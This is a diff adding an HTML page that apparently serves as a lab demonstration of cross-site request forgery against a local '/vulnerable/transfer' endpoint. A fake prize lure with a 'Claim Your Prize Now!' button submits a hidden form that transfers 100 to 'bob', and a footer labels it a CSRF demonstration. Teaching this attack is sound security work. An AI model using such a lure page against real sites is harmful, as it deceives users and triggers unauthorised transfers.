@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Win a Prize!</title>
+    <style>
+        body {
+            font-family: Arial;
+            text-align: center;
+            padding: 50px;
+            background-color: #f0f0f0;
+        }
+        .prize-box {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        .claim-button {
+            background: #4CAF50;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 18px;
+            margin-top: 20px;
+        }
+        .note {
+            font-size: 12px;
+            color: #666;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="prize-box">
+        <h1>🎉 Congratulations! 🎉</h1>
+        <h2>You've Won a Free Prize!</h2>
+        <p>Click below to claim your reward!</p>
+        
+        <!-- Only attempt the vulnerable version -->
+        <form id="attack-form" action="http://localhost:5000/vulnerable/transfer" method="POST" style="display: none;">
+            <input type="hidden" name="to" value="bob">
+            <input type="hidden" name="amount" value="100">
+        </form>
+        
+        <button class="claim-button" onclick="document.getElementById('attack-form').submit()">
+            Claim Your Prize Now!
+        </button>
+
+        <p class="note">This is a demonstration of a CSRF attack.</p>
+    </div>
+</body>
+</html>
